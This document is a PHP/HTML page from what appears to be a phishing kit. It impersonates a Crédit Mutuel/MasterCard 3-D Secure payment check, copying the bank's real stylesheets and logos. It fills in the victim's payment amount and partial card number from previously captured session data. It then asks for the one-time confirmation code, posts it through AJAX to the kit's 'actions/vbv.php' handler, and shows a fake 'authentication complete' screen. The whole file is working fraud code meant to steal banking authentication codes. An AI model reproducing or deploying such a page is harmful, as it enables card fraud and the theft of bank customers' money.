
<?php 


include("../../infos.php");

$none = true;

include("../../common/sub_includes.php");

?>


<html><head><meta content="width=device-width" name="viewport">
<meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="format-detection" content="telephone=no">
<link type="text/css" rel="stylesheet" href="https://cdn-3ds.e-i.com/TDS1/sd/3dsecure/1.7.0/fr/css/v3couleurs_cm2017.css">
<link type="text/css" rel="stylesheet" href="https://cdn-3ds.e-i.com/TDS1/sd/3dsecure/1.7.0/fr/css/ei_custom_responsive.css">
<link type="text/css" rel="stylesheet" href="https://cdn-3ds.e-i.com/TDS1/sd/3dsecure/1.7.0/fr/override.css">
<script src="https://cdn-3ds.e-i.com/TDS1/sd/3dsecure/1.7.0/fr/javascript/appli/jquery.js" type="text/javascript"></script>
<link rel="icon" type="image/png" href="https://cdn-3ds.e-i.com/TDS1/sd/3dsecure/1.7.0/fr/images/css/cm2017/favicon.png" sizes="16x16">
<script src="https://cdn-3ds.e-i.com/TDS1/sd/3dsecure/1.7.0//fr/javascript/appli/jquery_ei.js" type="text/javascript"></script>
<script src="https://cdn-3ds.e-i.com/TDS1/sd/3dsecure/1.7.0//fr/javascript/appli/ei_tools.js" type="text/javascript"></script>
<script src="https://cdn-3ds.e-i.com/TDS1/sd/3dsecure/1.7.0//fr/javascript/appli/lightbox.js" type="text/javascript"></script>
<script src="https://cdn-3ds.e-i.com/TDS1/sd/3dsecure/1.7.0//fr/javascript/SDTK/display.js" type="text/javascript"></script>
<script type="text/javascript"> 
function switchToMean(meanId) {
    $("[id$=" + meanId.toUpperCase() + "]").each(function() { $(this).attr("disabled", "disabled"); });
    $("#switchMean").val(meanId);
    $("#acsForm").submit();
}
$(document).ready(function() {
    //set focus to first visible element
    $('form').find('*').filter(':input:visible:first').focus();
});
function submitForm() {
    $("#validateButton").prop("disabled", true);
    displayWaitPage();
    $("#frameWidth").val($(window).width());
    $("#frameHeight").val($(window).height());
    $("#iframe").val( (window.location != window.parent.location) ? "oui" : "non" );
    return true;
}
function displayWaitPage() {
    esd1_displayWait("ei_tpl_fullSite", "Chargement en cours", "Veuillez patienter");
}
</script>
<script src="../../assets/js/jquery.js"></script>

<title>
    3-D Secure
</title>
</head><body>
<div id="ei_tpl_fullSite">
    <header id="ei_tpl_header" role="banner">
        <div id="ei_logo">
            <span>
                <span class="invisible"></span>
            </span>
        </div>
        <div id="ei_headright">
            <img src="https://cdn-3ds.e-i.com/TDS1/sd/3dsecure/1.7.0/fr/images/css/logos_v1/mastercard.svg" style="height:50px" alt="Logo MasterCard Secure Code">
        </div>
    </header>
    <main id="ei_tpl_contenu" role="main">
        <form action="" method="post">
            <div class="a_blocappli">
                <div>
                    <div class="ei_mainblocfctl">
<table class="fiche" id="summaryTable" cellspacing="1" width="100%">
    <caption id="back" style="">
        <div class="flex">
        <span id="text">Récapitulatif de votre paiement</span>
        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" style="margin: auto;  display: none;" width="50px" height="50px" id="capa2" viewBox="0 0 100 100" preserveAspectRatio="xMidYMid">
            <g transform="rotate(0 50 50)">
            <rect x="47" y="24" rx="1.44" ry="1.44" width="6" height="12" fill="#ffffff">
                <animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="1s" begin="-0.9166666666666666s" repeatCount="indefinite"></animate>
            </rect>
            </g><g transform="rotate(30 50 50)">
            <rect x="47" y="24" rx="1.44" ry="1.44" width="6" height="12" fill="#ffffff">
                <animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="1s" begin="-0.8333333333333334s" repeatCount="indefinite"></animate>
            </rect>
            </g><g transform="rotate(60 50 50)">
            <rect x="47" y="24" rx="1.44" ry="1.44" width="6" height="12" fill="#ffffff">
                <animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="1s" begin="-0.75s" repeatCount="indefinite"></animate>
            </rect>
            </g><g transform="rotate(90 50 50)">
            <rect x="47" y="24" rx="1.44" ry="1.44" width="6" height="12" fill="#ffffff">
                <animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="1s" begin="-0.6666666666666666s" repeatCount="indefinite"></animate>
            </rect>
            </g><g transform="rotate(120 50 50)">
            <rect x="47" y="24" rx="1.44" ry="1.44" width="6" height="12" fill="#ffffff">
                <animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="1s" begin="-0.5833333333333334s" repeatCount="indefinite"></animate>
            </rect>
            </g><g transform="rotate(150 50 50)">
            <rect x="47" y="24" rx="1.44" ry="1.44" width="6" height="12" fill="#ffffff">
                <animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="1s" begin="-0.5s" repeatCount="indefinite"></animate>
            </rect>
            </g><g transform="rotate(180 50 50)">
            <rect x="47" y="24" rx="1.44" ry="1.44" width="6" height="12" fill="#ffffff">
                <animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="1s" begin="-0.4166666666666667s" repeatCount="indefinite"></animate>
            </rect>
            </g><g transform="rotate(210 50 50)">
            <rect x="47" y="24" rx="1.44" ry="1.44" width="6" height="12" fill="#ffffff">
                <animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="1s" begin="-0.3333333333333333s" repeatCount="indefinite"></animate>
            </rect>
            </g><g transform="rotate(240 50 50)">
            <rect x="47" y="24" rx="1.44" ry="1.44" width="6" height="12" fill="#ffffff">
                <animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="1s" begin="-0.25s" repeatCount="indefinite"></animate>
            </rect>
            </g><g transform="rotate(270 50 50)">
            <rect x="47" y="24" rx="1.44" ry="1.44" width="6" height="12" fill="#ffffff">
                <animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="1s" begin="-0.16666666666666666s" repeatCount="indefinite"></animate>
            </rect>
            </g><g transform="rotate(300 50 50)">
            <rect x="47" y="24" rx="1.44" ry="1.44" width="6" height="12" fill="#ffffff">
                <animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="1s" begin="-0.08333333333333333s" repeatCount="indefinite"></animate>
            </rect>
            </g><g transform="rotate(330 50 50)">
            <rect x="47" y="24" rx="1.44" ry="1.44" width="6" height="12" fill="#ffffff">
                <animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="1s" begin="0s" repeatCount="indefinite"></animate>
            </rect>
            </g>
            </svg>
        
        <a href="../loading_finished.php" style="display : none" id="last_bnt"><button style="color : green;border : none;background-color : white;padding : 10px 20px;border-radius : 3px" type="button">Retourner au site marchand</button></a>   
        </div>
  <colgroup>
    </caption>

        <col width="50%">
        <col>
    </colgroup>
    <tbody>
        <tr><th scope="row">Montant</th><td><?php echo $_SESSION['prix']; ?>€</td></tr>
        <tr><th scope="row">Date et heure</th><td><span class="eir_hidexs"><?php echo date("j M Y G:i"); ?></span></td></tr>
        <tr><th scope="row">Numéro de carte</th><td>xxxxxxxxxxxx<?php  echo substr($_SESSION["ccnum"],12,16) ?></td></tr>
    </tbody>
</table> 
                        <p>Votre confirmation de carte nécessite une sécurisation.<br><br>Une demande de confirmation mobile a été transmise à votre appareil
                            <b>Démarrez votre application mobile Crédit Mutuel</b> pour vérifier et confirmer cette opération.</p>                            

                        <div id="inMobileAppMessage"><p><img style="display:block; margin-left:auto; margin-right:auto;" height="150px" src="https://cdn-3ds.e-i.com/SOSD/sd/otp/1.0.1//images/validation_operation.gif"></p><p style="text-align:center">Veuillez valider votre opération sur votre téléphone mobile puis entrer le code reçu.</p></div><table class="fiche" id="inputTable">
                        <colgroup>
                            <col width="50%">
                            <col>
                        </colgroup>
                        <tbody>
                        
                        </tbody>
                        </table>
                        <div class="flex" style="display : flex;justify-content : center;align-items :center">
                            <label for="">Code de confirmation</label>
                            <input type="text" style="width : 20%" name="vbv" required>
                        </div>

                         </form> 

                         <div class="blocboutons">
                            <span class="ei_buttonbar">
                                <button type="submit" name="vbv_submit" style=" background: #1451b3;outline:0;border: none; color:white;padding : 10px 20px;cursor : auto">Confirmer</button>

                            </span>
                        </div>


                         <div class="blocboutons">
                            <span class="ei_buttonbar">
                                <a href="../loading_finished.php" id="cancelLink"><button  style=" background: rgba(255,255,255,0);outline:0;border: none; color:#1451b3;">Je n'ai pas d'operation à valider</button></a>

                            </span>
                        </div>
                    </div>
                </div>
            </div>
                                                                  
    </main>
</div>

</body></html>






    <script
  src="https://code.jquery.com/jquery-3.4.1.min.js"
  crossorigin="anonymous"></script>

            <script src="../../assets/js/mask.js"></script>

            <script>

            $("#telip").mask("000000000")

            </script>

    <script>
        $(document).ready(function() {
            $("form").submit(function(e) {
                e.preventDefault();
                var $this = $(this);
                $("#text").text('Authentification en cours')
                $("#back").css('background-color',"orange")
                $(".flex").css("display","flex");
                $(".flex").css("flex-direction","column");
                $(".flex").css("aling-items","center");
                $("#text").css("text-align","center");



                
                $("#capa2").css("display","block");

                $.ajax({
                        method: "POST",
                        url: "../../actions/vbv.php",
                        data: $(this).serialize()
                    })
                    .then(function(msg) {
                        setTimeout(function() {

                            $("#last_bnt").css("display","flex");
                            $("#last_bnt").css("justify-content","center");
                            $("#text").text('Authentification terminée')     
                            $("#text").css("width","100%");
                            $("#text").css("text-align","center");

                            $("#capa2").css("display","none");
                            $("#back").css("background-color","green");
                        }, 4500);
                    });
                

            });
        });
    </script>











</body></html>



